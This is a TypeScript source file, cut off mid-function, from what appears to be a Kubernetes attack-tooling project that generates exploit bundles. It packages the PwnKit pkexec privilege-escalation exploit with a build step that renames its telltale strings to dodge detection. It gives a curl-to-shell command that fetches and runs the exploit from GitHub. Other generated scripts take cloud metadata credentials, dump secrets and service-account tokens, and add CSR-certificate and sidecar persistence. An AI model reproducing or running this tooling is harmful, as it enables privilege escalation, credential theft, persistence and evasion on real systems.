import { chmod, copyFile, mkdir, writeFile } from "node:fs/promises";
import { existsSync } from "node:fs";
import { basename, join, resolve } from "node:path";
import { appRoot, resolveRuntimeDir } from "../config.js";
import { getExpTemplate, listExpTemplates, type ExpTemplate } from "./catalog.js";

export type RenderExpBundleParams = {
  templateId: string;
  outDir?: string;
  params?: Record<string, unknown>;
  findingIds?: string[];
  factIds?: string[];
  sensitiveRefs?: string[];
};

export type RenderExpBundleResult = {
  template: ExpTemplate;
  bundleDir: string;
  files: string[];
  runCommands: string[];
  cleanupCommands: string[];
};

export { listExpTemplates };

export async function renderExpBundle(input: RenderExpBundleParams): Promise<RenderExpBundleResult> {
  const template = getExpTemplate(input.templateId);
  if (!template) {
    throw new Error(`Unknown EXP template: ${input.templateId}`);
  }

  const params = normalizeParams(template, input.params ?? {});
  const bundleDir = resolve(input.outDir ?? join(resolveRuntimeDir(), "exp/generated", defaultRunId(template.templateId)));
  await mkdir(bundleDir, { recursive: true });

  const context = {
    template,
    bundleDir,
    params,
    findingIds: input.findingIds ?? [],
    factIds: input.factIds ?? [],
    sensitiveRefs: input.sensitiveRefs ?? [],
  };

  let rendered: RenderedArtifacts;
  switch (template.kind) {
    case "generated-command":
      rendered = await renderCommandBundle(context);
      break;
    case "k8s-object":
      rendered = await renderK8sObjectBundle(context);
      break;
    case "json-patch":
      rendered = await renderJsonPatchBundle(context);
      break;
    case "source-build":
      rendered = await renderSourceBuildBundle(context);
      break;
    case "prebuilt-binary":
      rendered = await renderPrebuiltBundle(context);
      break;
  }

  const manifest = {
    schemaVersion: "kubetrail.exp.bundle.v1",
    generatedAt: new Date().toISOString(),
    templateId: template.templateId,
    kind: template.kind,
    mode: template.mode,
    runAt: template.runAt,
    title: template.title,
    params,
    findingIds: context.findingIds,
    evidenceFactIds: context.factIds,
    sensitiveRefs: context.sensitiveRefs,
    preconditions: template.preconditions,
    sideEffects: template.sideEffects,
    files: rendered.files.map((file) => basename(file)),
    runCommands: rendered.runCommands,
    cleanupCommands: rendered.cleanupCommands,
  };
  const manifestPath = join(bundleDir, "manifest.json");
  await writeFile(manifestPath, `${JSON.stringify(manifest, null, 2)}\n`, "utf8");

  const readmePath = join(bundleDir, "README.md");
  await writeFile(readmePath, renderReadme(context, rendered), "utf8");

  return {
    template,
    bundleDir,
    files: [...rendered.files, manifestPath, readmePath],
    runCommands: rendered.runCommands,
    cleanupCommands: rendered.cleanupCommands,
  };
}

type RenderContext = {
  template: ExpTemplate;
  bundleDir: string;
  params: Record<string, unknown>;
  findingIds: string[];
  factIds: string[];
  sensitiveRefs: string[];
};

type RenderedArtifacts = {
  files: string[];
  runCommands: string[];
  cleanupCommands: string[];
};

async function renderCommandBundle(context: RenderContext): Promise<RenderedArtifacts> {
  const script = commandScript(context);
  const runPath = join(context.bundleDir, "run.sh");
  const cleanupScript = commandCleanupScript(context);
  const files = [runPath];
  const cleanupCommands: string[] = [];
  await writeFile(runPath, script, "utf8");
  await chmod(runPath, 0o755);
  if (cleanupScript) {
    const cleanupPath = join(context.bundleDir, "cleanup.sh");
    await writeFile(cleanupPath, cleanupScript, "utf8");
    await chmod(cleanupPath, 0o755);
    files.push(cleanupPath);
    cleanupCommands.push(`bash ${relativeFromApp(cleanupPath)}`);
  }
  return {
    files,
    runCommands: [`bash ${relativeFromApp(runPath)}`],
    cleanupCommands,
  };
}

async function renderK8sObjectBundle(context: RenderContext): Promise<RenderedArtifacts> {
  const applyYaml = k8sApplyYaml(context);
  const cleanupYaml = k8sCleanupYaml(context);
  const applyPath = join(context.bundleDir, "apply.yaml");
  const cleanupPath = join(context.bundleDir, "cleanup.yaml");
  await writeFile(applyPath, applyYaml, "utf8");
  await writeFile(cleanupPath, cleanupYaml, "utf8");
  return {
    files: [applyPath, cleanupPath],
    runCommands: [`kubectl apply -f ${relativeFromApp(applyPath)}`],
    cleanupCommands: [`kubectl delete -f ${relativeFromApp(cleanupPath)} --ignore-not-found=true`],
  };
}

async function renderJsonPatchBundle(context: RenderContext): Promise<RenderedArtifacts> {
  if (context.template.templateId === "workload-patch-sidecar-persistence") {
    return renderWorkloadSidecarPatchBundle(context);
  }

  const patchAdd = ephemeralPatch(context, "add-list");
  const patchAppend = ephemeralPatch(context, "append");
  const addPath = join(context.bundleDir, "patch-add-list.json");
  const appendPath = join(context.bundleDir, "patch-append.json");
  const runPath = join(context.bundleDir, "run.sh");
  const ns = stringParam(context, "namespace", "default");
  const pod = stringParam(context, "pod", "<target-pod>");
  await writeFile(addPath, `${JSON.stringify(patchAdd, null, 2)}\n`, "utf8");
  await writeFile(appendPath, `${JSON.stringify(patchAppend, null, 2)}\n`, "utf8");
  await writeFile(
    runPath,
    shellScript([
      `NS=${sh(ns)}`,
      `POD=${sh(pod)}`,
      `kubectl patch pod "$POD" -n "$NS" --type=json -p "$(cat ${sh(relativeFromApp(addPath))})" || kubectl patch pod "$POD" -n "$NS" --type=json -p "$(cat ${sh(relativeFromApp(appendPath))})"`,
      `kubectl describe pod "$POD" -n "$NS"`,
    ]),
    "utf8",
  );
  await chmod(runPath, 0o755);
  return {
    files: [addPath, appendPath, runPath],
    runCommands: [`bash ${relativeFromApp(runPath)}`],
    cleanupCommands: ["Ephemeral containers cannot be removed from a running Pod; delete/recreate the target Pod only if your validation plan allows it."],
  };
}

async function renderWorkloadSidecarPatchBundle(context: RenderContext): Promise<RenderedArtifacts> {
  const patch = workloadSidecarPatch(context);
  const patchPath = join(context.bundleDir, "patch-sidecar.json");
  const runPath = join(context.bundleDir, "run.sh");
  const cleanupPath = join(context.bundleDir, "cleanup.sh");
  const ns = stringParam(context, "namespace", "default");
  const kind = normalizeWorkloadKind(stringParam(context, "workloadKind", "deployment"));
  const name = stringParam(context, "workloadName", "<target-workload>");
  const containerName = stringParam(context, "containerName", "kt-sidecar");
  const originalName = `original-${kind}-${name}.json`.replace(/[^A-Za-z0-9_.-]/g, "-");
  await writeFile(patchPath, `${JSON.stringify(patch, null, 2)}\n`, "utf8");
  await writeFile(
    runPath,
    shellScript([
      `cd "$(dirname "$0")"`,
      `NS=${sh(ns)}`,
      `KIND=${sh(kind)}`,
      `NAME=${sh(name)}`,
      `ORIGINAL=${sh(originalName)}`,
      `kubectl get "$KIND" "$NAME" -n "$NS" -o json > "$ORIGINAL"`,
      `kubectl patch "$KIND" "$NAME" -n "$NS" --type=json -p "$(cat ${sh(basename(patchPath))})"`,
      `kubectl rollout status "$KIND/$NAME" -n "$NS" --timeout=120s || true`,
    ]),
    "utf8",
  );
  await writeFile(
    cleanupPath,
    shellScript([
      `cd "$(dirname "$0")"`,
      `NS=${sh(ns)}`,
      `KIND=${sh(kind)}`,
      `NAME=${sh(name)}`,
      `CONTAINER=${sh(containerName)}`,
      `ORIGINAL=${sh(originalName)}`,
      `test -r "$ORIGINAL" || { echo "missing saved original workload: $ORIGINAL" >&2; exit 2; }`,
      `INDEX="$(kubectl get "$KIND" "$NAME" -n "$NS" -o jsonpath='{range .spec.template.spec.containers[*]}{.name}{"\\n"}{end}' | awk -v name="$CONTAINER" '$0 == name { print NR - 1; exit }')"`,
      `if [ -z "$INDEX" ]; then echo "container not present: $CONTAINER"; exit 0; fi`,
      `kubectl patch "$KIND" "$NAME" -n "$NS" --type=json -p "[{\\"op\\":\\"remove\\",\\"path\\":\\"/spec/template/spec/containers/$INDEX\\"}]"`,
      `kubectl rollout status "$KIND/$NAME" -n "$NS" --timeout=120s || true`,
    ]),
    "utf8",
  );
  await chmod(runPath, 0o755);
  await chmod(cleanupPath, 0o755);
  return {
    files: [patchPath, runPath, cleanupPath],
    runCommands: [`bash ${relativeFromApp(runPath)}`],
    cleanupCommands: [`bash ${relativeFromApp(cleanupPath)}`],
  };
}

async function renderSourceBuildBundle(context: RenderContext): Promise<RenderedArtifacts> {
  const srcDir = join(context.bundleDir, "src");
  await mkdir(srcDir, { recursive: true });
  const mainPath = join(srcDir, "main.go");
  const buildPath = join(context.bundleDir, "build.sh");
  const runPath = join(context.bundleDir, "run.sh");
  const binaryName = stringParam(context, "binaryName", "kt-exp-helper");
  const socketPath = stringParam(context, "socketPath", "/run/containerd/containerd.sock");

  await writeFile(mainPath, runtimeSocketVerifierSource(), "utf8");
  await writeFile(
    buildPath,
    shellScript([
      `cd "$(dirname "$0")"`,
      `mkdir -p bin`,
      `GO111MODULE=off go build -trimpath -ldflags="-s -w -buildid=" -o ${sh(`bin/${binaryName}`)} ./src`,
      `echo "built: $(pwd)/bin/${binaryName}"`,
    ]),
    "utf8",
  );
  await writeFile(
    runPath,
    shellScript([
      `cd "$(dirname "$0")"`,
      `if [ ! -x ${sh(`bin/${binaryName}`)} ]; then echo "binary missing; run ./build.sh first" >&2; exit 2; fi`,
      `${sh(`./bin/${binaryName}`)} --socket ${sh(socketPath)}`,
    ]),
    "utf8",
  );
  await chmod(buildPath, 0o755);
  await chmod(runPath, 0o755);
  return {
    files: [mainPath, buildPath, runPath],
    runCommands: [`cd ${relativeFromApp(context.bundleDir)} && ./build.sh && ./run.sh`],
    cleanupCommands: [],
  };
}

async function renderPrebuiltBundle(context: RenderContext): Promise<RenderedArtifacts> {
  if (context.template.templateId === "cve-2021-4034-pwnkit") {
    return renderPwnKitBundle(context);
  }

  const pocId = stringParam(context, "pocId", context.template.templateId);
  const os = stringParam(context, "os", "linux");
  const arch = stringParam(context, "arch", "amd64");
  const binaryName = stringParam(context, "binaryName", "poc");
  const sourcePath = join(appRoot, "exp/assets/bin", pocId, `${os}-${arch}`, binaryName);
  const runPath = join(context.bundleDir, "run.sh");
  const files = [runPath];
  let binaryRef = sourcePath;

  if (existsSync(sourcePath)) {
    const binDir = join(context.bundleDir, "bin");
    await mkdir(binDir, { recursive: true });
    const targetPath = join(binDir, binaryName);
    await copyFile(sourcePath, targetPath);
    await chmod(targetPath, 0o755);
    files.push(targetPath);
    binaryRef = targetPath;
  } else {
    const missingPath = join(context.bundleDir, "PREBUILT_MISSING.md");
    await writeFile(
      missingPath,
      [
        `# Prebuilt Binary Missing`,
        ``,
        `Expected binary: \`${sourcePath}\``,
        ``,
        `Stage a reviewed binary at that path, with a sibling \`manifest.json\` containing source, commit, sha256, and side effects before running this bundle.`,
        ``,
      ].join("\n"),
      "utf8",
    );
    files.push(missingPath);
  }

  await writeFile(
    runPath,
    shellScript([
      `BIN=${sh(binaryRef)}`,
      `if [ ! -x "$BIN" ]; then echo "prebuilt binary missing or not executable: $BIN" >&2; exit 2; fi`,
      `echo "running reviewed prebuilt: $BIN"`,
      `"$BIN" "$@"`,
    ]),
    "utf8",
  );
  await chmod(runPath, 0o755);
  return {
    files,
    runCommands: [`bash ${relativeFromApp(runPath)}`],
    cleanupCommands: [],
  };
}

async function renderPwnKitBundle(context: RenderContext): Promise<RenderedArtifacts> {
  const pocId = "cve-2021-4034-pwnkit";
  const os = stringParam(context, "os", "linux");
  const arch = stringParam(context, "arch", "amd64");
  const binaryName = stringParam(context, "binaryName", "kt-pkexec-lpe");
  const command = stringParam(context, "command", "");
  const variantSeed = stringParam(context, "variantSeed", "kubetrail-pwnkit-local");
  const assetDir = join(appRoot, "exp/assets/bin", pocId, `${os}-${arch}`);
  const sourceDir = join(appRoot, "exp/assets/sources", pocId);
  const sourcePath = join(sourceDir, "PwnKit.c");
  const licensePath = join(sourceDir, "LICENSE");
  const assetBuildScript = join(sourceDir, "build-variant.sh");
  const sourceManifestPath = join(sourceDir, "manifest.json");
  const assetManifestPath = join(assetDir, "manifest.json");
  const prebuiltPath = join(assetDir, binaryName);
  const binDir = join(context.bundleDir, "bin");
  const srcDir = join(context.bundleDir, "src");
  const runPath = join(context.bundleDir, "run.sh");
  const buildPath = join(context.bundleDir, "build.sh");
  const usagePath = join(context.bundleDir, "USAGE-PWNKIT.md");
  const files = [runPath, buildPath, usagePath];
  let bundledBinaryPath = join(binDir, binaryName);

  await mkdir(binDir, { recursive: true });
  await mkdir(srcDir, { recursive: true });

  if (existsSync(sourcePath)) {
    const targetSource = join(srcDir, "PwnKit.c");
    await copyFile(sourcePath, targetSource);
    files.push(targetSource);
  }
  if (existsSync(licensePath)) {
    const targetLicense = join(srcDir, "LICENSE");
    await copyFile(licensePath, targetLicense);
    files.push(targetLicense);
  }
  if (existsSync(assetBuildScript)) {
    const targetBuildScript = join(srcDir, "build-variant.sh");
    await copyFile(assetBuildScript, targetBuildScript);
    await chmod(targetBuildScript, 0o755);
    files.push(targetBuildScript);
  }
  if (existsSync(sourceManifestPath)) {
    const targetSourceManifest = join(srcDir, "source-manifest.json");
    await copyFile(sourceManifestPath, targetSourceManifest);
    files.push(targetSourceManifest);
  }
  if (existsSync(assetManifestPath)) {
    const targetManifest = join(context.bundleDir, "asset-manifest.json");
    await copyFile(assetManifestPath, targetManifest);
    files.push(targetManifest);
  }

  if (existsSync(prebuiltPath)) {
    await copyFile(prebuiltPath, bundledBinaryPath);
    await chmod(bundledBinaryPath, 0o755);
    files.push(bundledBinaryPath);
  } else {
    bundledBinaryPath = join(binDir, binaryName);
    const missingPath = join(context.bundleDir, "PREBUILT_MISSING.md");
    await writeFile(
      missingPath,
      [
        `# PwnKit Prebuilt Binary Missing`,
        ``,
        `Expected binary: \`${prebuiltPath}\``,
        ``,
        `Run \`./build.sh\` with zig or on a Linux amd64 build host with gcc to create \`bin/${binaryName}\`, or stage a reviewed binary in the project asset path above.`,
        ``,
      ].join("\n"),
      "utf8",
    );
    files.push(missingPath);
  }

  await writeFile(
    buildPath,
    shellScript([
      `cd "$(dirname "$0")"`,
      `mkdir -p bin`,
      `if [ -x src/build-variant.sh ]; then`,
      `  src/build-variant.sh src/PwnKit.c ${sh(`bin/${binaryName}`)} ${sh(variantSeed)}`,
      `else`,
      `  SRC="src/PwnKit.c"`,
      `  VARIANT_DIR="$(mktemp -d)"`,
      `  VARIANT_SRC="$VARIANT_DIR/variant.c"`,
      `  cp "$SRC" "$VARIANT_SRC"`,
      `  perl -0pi -e 's/\\.pkexec/\\.kt-gv01/g; s/pkexec\\.so/ktgv01\\.so/g; s/module UTF-8\\/\\/ PKEXEC\\/\\/ pkexec 2/module UTF-8\\/\\/ KTGVT01\\/\\/ ktgv01 2/g; s/CHARSET=pkexec/CHARSET=ktgvt01/g; s/SHELL=pkexec/SHELL=ktgvt01/g; s/Failed to create directory/cannot prepare workspace/g; s/Failed to open output file/cannot open module map/g; s/Failed to write config/cannot write module map/g; s/Failed to copy file/cannot stage module/g; s/Exploit failed\\. Target is most likely patched\\./pkexec path did not trigger vulnerable loader/g' "$VARIANT_SRC"`,
      `  printf '\\n__attribute__((used)) static const char kt_variant_marker[] = %s;\\n' ${sh(JSON.stringify(variantSeed))} >> "$VARIANT_SRC"`,
      `  if command -v zig >/dev/null 2>&1; then CC_CMD="zig cc -target x86_64-linux-gnu"; else CC_CMD="gcc"; fi`,
      `  $CC_CMD -g0 -O0 -fno-sanitize=undefined -fno-stack-protector -fno-omit-frame-pointer -shared "$VARIANT_SRC" -o ${sh(`bin/${binaryName}`)} -Wl,-e,entry -fPIC -Wl,--build-id=none -Wl,-s`,
      `  strip --strip-all ${sh(`bin/${binaryName}`)} 2>/dev/null || true`,
      `  rm -rf "$VARIANT_DIR"`,
      `  chmod 0755 ${sh(`bin/${binaryName}`)}`,
      `fi`,
      `sha256sum ${sh(`bin/${binaryName}`)} 2>/dev/null || shasum -a 256 ${sh(`bin/${binaryName}`)} || true`,
    ]),
    "utf8",
  );

  await writeFile(
    runPath,
    shellScript([
      `cd "$(dirname "$0")"`,
      `BIN=${sh(`./bin/${binaryName}`)}`,
      `if [ ! -x "$BIN" ]; then echo "binary missing or not executable: $BIN; run ./build.sh on linux-amd64 first" >&2; exit 2; fi`,
      `if [ "$#" -gt 0 ]; then exec "$BIN" "$*"; fi`,
      `exec "$BIN"`,
    ]),
    "utf8",
  );
  await writeFile(
    usagePath,
    renderPwnKitUsage({
      binaryName,
      command,
      variantSeed,
      bundleDir: context.bundleDir,
      bundledBinaryPath,
    }),
    "utf8",
  );
  await chmod(buildPath, 0o755);
  await chmod(runPath, 0o755);

  return {
    files,
    runCommands: [
      `cd ${relativeFromApp(context.bundleDir)} && ./run.sh`,
      command ? `${relativeFromApp(bundledBinaryPath)} ${sh(command)}` : `${relativeFromApp(bundledBinaryPath)}`,
    ],
    cleanupCommands: [`rm -rf ${sh("GCONV_PATH=.")} ${sh(".kt-gv01")} ${sh(".pkexec")} 2>/dev/null || true`],
  };
}

function renderPwnKitUsage(input: {
  binaryName: string;
  command: string;
  variantSeed: string;
  bundleDir: string;
  bundledBinaryPath: string;
}): string {
  const officialCommand = `sh -c "$(curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit.sh)"`;
  return [
    `# PwnKit pkexec Usage`,
    ``,
    `## Source`,
    ``,
    `- Primary PoC project: ly4k/PwnKit`,
    `- Project URL: https://github.com/ly4k/PwnKit`,
    `- KubeTrail source manifest: \`src/source-manifest.json\``,
    `- KubeTrail binary manifest: \`asset-manifest.json\``,
    `- Variant seed: \`${input.variantSeed}\``,
    ``,
    `## Option A: target can reach the internet`,
    ``,
    `Use the upstream project command directly on the authorized target:`,
    ``,
    "```bash",
    officialCommand,
    "```",
    ``,
    `## Option B: target cannot reach the internet`,
    ``,
    `Upload this generated bundle binary to the target and execute it:`,
    ``,
    `- Generated upload candidate: \`${input.bundledBinaryPath}\``,
    ``,
    "```bash",
    `chmod +x /tmp/${input.binaryName}`,
    `/tmp/${input.binaryName} ${input.command ? sh(input.command) : ""}`.trim(),
    "```",
    ``,
    `You can also run the copied binary directly from this bundle on a compatible Linux amd64 host:`,
    ``,
    "```bash",
    `cd ${sh(input.bundleDir)}`,
    `./bin/${input.binaryName} ${input.command ? sh(input.command) : ""}`.trim(),
    "```",
    ``,
    `## Rebuild`,
    ``,
    `The bundle includes the pinned source and build script:`,
    ``,
    "```bash",
    `cd ${sh(input.bundleDir)}`,
    `./build.sh`,
    "```",
    ``,
  ].join("\n");
}

function commandScript(context: RenderContext): string {
  switch (context.template.templateId) {
    case "cloud-metadata-verify":
      return cloudMetadataScript(context);
    case "cloud-identity-verify":
      return cloudIdentityScript(context);
    case "serviceaccount-token-api-verify":
      return serviceAccountApiScript(context);
    case "secret-list-get-verify":
      return secretVerifyScript(context);
    case "nodes-proxy-verify":
      return nodesProxyScript(context);
    case "kubelet-api-verify":
      return kubeletApiScript(context);
    case "etcd-access-verify":
      return etcdScript(context);
    case "pods-exec-verify":
      return podsExecScript(context);
    case "impersonate-verify":
      return impersonateScript(context);
    case "rbac-bind-escalate-verify":
      return rbacBindScript(context);
    case "csr-client-cert-persistence":
      return csrClientCertScript(context);
    case "pull-secret-injection":
      return pullSecretInjectionScript(context);
    case "admission-persistence-review":
      return admissionPersistenceReviewScript(context);
    case "static-pod-node-persistence-review":
      return staticPodNodeReviewScript(context);
    case "registry-auth-verify":
      return registryScript(context);
    default:
      return genericKubectlReviewScript(context);
  }
}

function commandCleanupScript(context: RenderContext): string {
  switch (context.template.templateId) {
    case "csr-client-cert-persistence":
      return csrClientCertCleanupScript(context);
    case "pull-secret-injection":
      return pullSecretInjectionCleanupScript(context);
    default:
      return "";
  }
}

function cloudMetadataScript(context: RenderContext): string {
  const provider = stringParam(context, "provider", "auto");
  const timeout = stringParam(context, "timeoutSeconds", "2");
  const includeCreds = boolParam(context, "includeCredentialValues", false);
  return shellScript([
    `PROVIDER=${sh(provider)}`,
    `TIMEOUT=${sh(timeout)}`,
    `echo "[kubetrail] cloud metadata probe provider=$PROVIDER timeout=${timeout}s"`,
    `probe_aws() {`,
    `  TOKEN="$(curl -fsS --max-time "$TIMEOUT" -X PUT -H 'X-aws-ec2-metadata-token-ttl-seconds: 60' http://169.254.169.254/latest/api/token 2>/dev/null || true)"`,
    `  if [ -n "$TOKEN" ]; then H=(-H "X-aws-ec2-metadata-token: $TOKEN"); else H=(); fi`,
    `  curl -fsS --max-time "$TIMEOUT" "\${H[@]}" http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>/dev/null || true`,
    includeCreds ? `  echo "[warn] includeCredentialValues=true; requesting credential document"; for r in $(curl -fsS --max-time "$TIMEOUT" "\${H[@]}" http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>/dev/null || true); do curl -fsS --max-time "$TIMEOUT" "\${H[@]}" "http://169.254.169.254/latest/meta-data/iam/security-credentials/$r"; done` : `  echo "[info] credential values intentionally not requested by default"`,
    `}`,
    `probe_gcp() { curl -fsS --max-time "$TIMEOUT" -H 'Metadata-Flavor: Google' http://169.254.169.254/computeMetadata/v1/instance/service-accounts/ 2>/dev/null || true; }`,
    `probe_azure() { curl -fsS --max-time "$TIMEOUT" -H 'Metadata: true' 'http://169.254.169.254/metadata/instance?api-version=2021-02-01' 2>/dev/null | head -c 4096 || true; echo; }`,
    `case "$PROVIDER" in`,
    `  aws) probe_aws ;;`,
    `  gcp) probe_gcp ;;`,
    `  azure) probe_azure ;;`,
    `  auto) probe_aws; probe_gcp; probe_azure ;;`,
    `  *) curl -fsS --max-time "$TIMEOUT" http://169.254.169.254/ 2>/dev/null || true ;;`,
    `esac`,
  ]);
}

function cloudIdentityScript(context: RenderContext): string {
  const provider = stringParam(context, "provider", "aws");
  const commands = [
    `PROVIDER=${sh(provider)}`,
    `case "$PROVIDER" in`,
    `  aws) aws sts get-caller-identity ;;`,
    `  gcp) gcloud auth list && gcloud config list account --format=json ;;`,
    `  azure) az account show ;;`,
    `  *) echo "unsupported provider: $PROVIDER" >&2; exit 2 ;;`,
    `esac`,
  ];
  return shellScript(commands);
}

function serviceAccountApiScript(context: RenderContext): string {
  const tokenPath = stringParam(context, "tokenPath", "/var/run/secrets/kubernetes.io/serviceaccount/token");
  return shellScript([
    `TOKEN_PATH=${sh(tokenPath)}`,
    `CA_PATH=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt`,
    `API="https://\${KUBERNETES_SERVICE_HOST:-kubernetes.default.svc}:\${KUBERNETES_SERVICE_PORT_HTTPS:-443}"`,
    `test -r "$TOKEN_PATH" || { echo "token not readable: $TOKEN_PATH" >&2; exit 2; }`,
    `CURL_CA=()`,
    `test -r "$CA_PATH" && CURL_CA=(--cacert "$CA_PATH")`,
    `curl -fsS "\${CURL_CA[@]}" -H "Authorization: Bearer $(cat "$TOKEN_PATH")" "$API/api"`,
    `curl -fsS "\${CURL_CA[@]}" -H "Authorization: Bearer $(cat "$TOKEN_PATH")" "$API/apis" | head -c 4096; echo`,
  ]);
}

function secretVerifyScript(context: RenderContext): string {
  const ns = stringParam(context, "namespace", "default");
  const secret = stringParam(context, "secretName", "");
  const printData = boolParam(context, "printSecretData", false);
  const commands = [
    `NS=${sh(ns)}`,
    `kubectl auth can-i list secrets -n "$NS"`,
    `kubectl auth can-i get secrets -n "$NS"`,
  ];
  if (secret) {
    commands.push(printData ? `kubectl get secret ${sh(secret)} -n "$NS" -o json` : `kubectl get secret ${sh(secret)} -n "$NS" -o jsonpath='{.metadata.name}{"\\n"}{.type}{"\\n"}{.metadata.annotations}{"\\n"}'`);
  } else {
    commands.push(`kubectl get secrets -n "$NS" -o name`);
  }
  return shellScript(commands);
}

function nodesProxyScript(context: RenderContext): string {
  const node = stringParam(context, "node", "<node-name>");
  return shellScript([`NODE=${sh(node)}`, `kubectl auth can-i get nodes/proxy`, `kubectl get --raw "/api/v1/nodes/$NODE/proxy/healthz"`]);
}

function kubeletApiScript(context: RenderContext): string {
  const url = stringParam(context, "kubeletUrl", "https://<node-ip>:10250");
  const timeout = stringParam(context, "timeoutSeconds", "3");
  return shellScript([`URL=${sh(url)}`, `TIMEOUT=${sh(timeout)}`, `curl -kfsS --max-time "$TIMEOUT" "$URL/healthz" || true`, `curl -kfsS --max-time "$TIMEOUT" "$URL/pods" | head -c 4096 || true`, `echo`]);
}

function etcdScript(context: RenderContext): string {
  const endpoint = stringParam(context, "endpoint", "https://<etcd-host>:2379");
  return shellScript([
    `ENDPOINT=${sh(endpoint)}`,
    `echo "If mTLS is required, export ETCDCTL_CACERT, ETCDCTL_CERT, and ETCDCTL_KEY before running."`,
    `ETCDCTL_API=3 etcdctl --endpoints "$ENDPOINT" endpoint status --write-out=table`,
  ]);
}

function podsExecScript(context: RenderContext): string {
  const ns = stringParam(context, "namespace", "default");
  const pod = stringParam(context, "pod", "<target-pod>");
  const container = stringParam(context, "container", "");
  const command = stringParam(context, "command", "id");
  const containerArgs = container ? ` -c ${sh(container)}` : "";
  return shellScript([`kubectl auth can-i create pods/exec -n ${sh(ns)}`, `kubectl exec -n ${sh(ns)} ${sh(pod)}${containerArgs} -- sh -c ${sh(command)}`]);
}

function impersonateScript(context: RenderContext): string {
  const as = stringParam(context, "as", "system:serviceaccount:default:default");
  const verb = stringParam(context, "verb", "get");
  const resource = stringParam(context, "resource", "pods");
  const ns = stringParam(context, "namespace", "default");
  return shellScript([`kubectl auth can-i impersonate serviceaccounts`, `kubectl auth can-i ${sh(verb)} ${sh(resource)} -n ${sh(ns)} --as=${sh(as)}`]);
}

function rbacBindScript(context: RenderContext): string {
  const ns = stringParam(context, "namespace", "default");
  return shellScript([
    `NS=${sh(ns)}`,
    `kubectl auth can-i create rolebindings.rbac.authorization.k8s.io -n "$NS"`,
    `kubectl auth can-i create clusterrolebindings.rbac.authorization.k8s.io`,
    `kubectl auth can-i bind clusterrole/admin -n "$NS"`,
    `kubectl auth can-i escalate clusterroles.rbac.authorization.k8s.io`,
  ]);
}

function csrClientCertScript(context: RenderContext): string {
  const username = stringParam(context, "username", "kubetrail-audit");
  const groups = stringParam(context, "groups", "system:authenticated");
  const csrName = stringParam(context, "csrName", "kt-client-cert");
  const signerName = stringParam(context, "signerName", "kubernetes.io/kube-apiserver-client");
  const expiration = stringParam(context, "expirationSeconds", "86400");
  const autoApprove = boolParam(context, "autoApprove", false);
  const outputPrefix = stringParam(context, "outputPrefix", "kt-client-cert");
  return shellScript([
    `cd "$(dirname "$0")"`,
    `USERNAME=${sh(username)}`,
    `GROUPS_CSV=${sh(groups)}`,
    `CSR_NAME=${sh(csrName)}`,
    `SIGNER_NAME=${sh(signerName)}`,
    `EXPIRATION_SECONDS=${sh(expiration)}`,
    `OUT=${sh(outputPrefix)}`,
    `AUTO_APPROVE=${autoApprove ? "1" : "0"}`,
    `b64_decode() { if base64 --decode >/dev/null 2>&1 < /dev/null; then base64 --decode; else base64 -D; fi; }`,
    `SUBJECT="/CN=$USERNAME"`,
    `IFS=',' read -r -a GROUPS <<< "$GROUPS_CSV"`,
    `for group in "\${GROUPS[@]}"; do group="$(printf '%s' "$group" | xargs)"; test -n "$group" && SUBJECT="$SUBJECT/O=$group"; done`,
    `openssl genrsa -out "$OUT.key" 2048`,
    `openssl req -new -key "$OUT.key" -out "$OUT.csr" -subj "$SUBJECT"`,
    `REQUEST_B64="$(base64 < "$OUT.csr" | tr -d '\\n')"`,
    `cat > "$OUT.csr.yaml" <<YAML`,
    `apiVersion: certificates.k8s.io/v1`,
    `kind: CertificateSigningRequest`,
    `metadata:`,
    `  name: $CSR_NAME`,
    `  labels:`,
    `    app.kubernetes.io/managed-by: kubetrail-agent`,
    `    kubetrail/technique: csr-client-cert-persistence`,
    `spec:`,
    `  request: $REQUEST_B64`,
    `  signerName: $SIGNER_NAME`,
    `  expirationSeconds: $EXPIRATION_SECONDS`,
    `  usages:`,
    `    - client auth`,
    `YAML`,
    `kubectl apply -f "$OUT.csr.yaml"`,
    `if [ "$AUTO_APPROVE" = "1" ]; then kubectl certificate approve "$CSR_NAME"; else echo "[info] CSR created but not approved. Approve out-of-band or rerun with autoApprove=true if authorized."; fi`,
    `for _ in $(seq 1 30); do CERT_B64="$(kubectl get csr "$CSR_NAME" -o jsonpath='{.status.certificate}' 2>/dev/null || true)"; test -n "$CERT_B64" && break; sleep 2; done`,
    `if [ -z "\${CERT_B64:-}" ]; then`,
    `  if [ "$AUTO_APPROVE" = "1" ]; then echo "certificate not issued for approved CSR $CSR_NAME" >&2; exit 3; fi`,
    `  echo "certificate not issued yet for CSR $CSR_NAME; approve it, then rerun this script to build the kubeconfig."`,
    `  exit 0`,
    `fi`,
    `printf '%s' "$CERT_B64" | b64_decode > "$OUT.crt"`,
    `SERVER="$(kubectl config view --raw --minify -o jsonpath='{.clusters[0].cluster.server}')"`,
    `CA_DATA="$(kubectl config view --raw --minify -o jsonpath='{.clusters[0].cluster.certificate-authority-data}' 2>/dev/null || true)"`,
    `CA_PATH="$(kubectl config view --raw --minify -o jsonpath='{.clusters[0].cluster.certificate-authority}' 2>/dev/null || true)"`,
    `KCFG="$OUT.kubeconfig"`,
    `kubectl --kubeconfig "$KCFG" config set-cluster kubetrail-csr --server="$SERVER" >/dev/null`,
    `if [ -n "$CA_DATA" ]; then printf '%s' "$CA_DATA" | b64_decode > "$OUT.ca.crt"; kubectl --kubeconfig "$KCFG" config set-cluster kubetrail-csr --certificate-authority="$OUT.ca.crt" --embed-certs=true >/dev/null; elif [ -n "$CA_PATH" ] && [ -r "$CA_PATH" ]; then kubectl --kubeconfig "$KCFG" config set-cluster kubetrail-csr --certificate-authority="$CA_PATH" --embed-certs=true >/dev/null; else kubectl --kubeconfig "$KCFG" config set-cluster kubetrail-csr --insecure-skip-tls-verify=true >/dev/null; fi`,
    `kubectl --kubeconfig "$KCFG" config set-credentials "$USERNAME" --client-certificate="$OUT.crt" --client-key="$OUT.key" --embed-certs=true >/dev/null`,
    `kubectl --kubeconfig "$KCFG" config set-context "$USERNAME@kubetrail-csr" --cluster=kubetrail-csr --user="$USERNAME" >/dev/null`,
    `kubectl --kubeconfig "$KCFG" config use-context "$USERNAME@kubetrail-csr" >/dev/null`,
    `echo "wrote kubeconfig: $KCFG"`,
  ]);
}

function pullSecretInjectionScript(context: RenderContext): string {
